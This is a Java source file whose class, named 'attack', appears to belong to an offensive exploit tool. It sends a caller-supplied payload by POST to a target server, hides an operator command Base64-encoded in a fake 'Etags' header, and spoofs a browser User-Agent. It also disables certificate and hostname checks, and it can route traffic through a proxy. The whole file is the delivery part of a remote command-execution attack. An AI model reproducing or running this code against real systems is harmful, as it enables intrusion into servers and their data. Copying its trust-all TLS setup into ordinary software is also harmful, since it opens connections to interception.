package com.example.frchannel;

import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContextBuilder;
import org.apache.http.util.EntityUtils;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import java.util.Base64;


public class attack {

    public attack() throws Exception {
    }

    // 发送payload
    public static String send(String url, byte[] bytes, String cmd, HttpHost proxy) throws Exception {

        HttpClient httpClient = null;

        if (url.contains("https://")){
            SSLContext sslContext = SSLContextBuilder
                    .create()
                    .loadTrustMaterial(new TrustSelfSignedStrategy())
                    .build();
            HostnameVerifier allowAllHosts = new NoopHostnameVerifier();
            SSLConnectionSocketFactory connectionFactory = new SSLConnectionSocketFactory(sslContext, allowAllHosts);
            httpClient = HttpClients.custom()
                    .setSSLSocketFactory(connectionFactory)
                    .build();
        }
        else {
            httpClient = HttpClients.createDefault();
        }

        HttpPost httpPost = new HttpPost(url);

        httpPost.setEntity(new ByteArrayEntity(bytes));
        // 创建RequestConfig，并设置代理
        RequestConfig config = RequestConfig.custom()
                .setProxy(proxy)
                .setSocketTimeout(10000)
                .setConnectTimeout(10000)
                .build();
        // 将RequestConfig配置应用于HttpPost
        httpPost.setConfig(config);
        httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
        httpPost.setHeader("Content-Type","gzip");

        if (cmd != null){
            httpPost.setHeader("Etags",Base64.getEncoder().encodeToString(cmd.getBytes()));
        }

        try {
            HttpResponse response = httpClient.execute(httpPost);
            return EntityUtils.toString(response.getEntity());

        } catch (Exception e) {
            return e.getMessage();
        }
    }


}
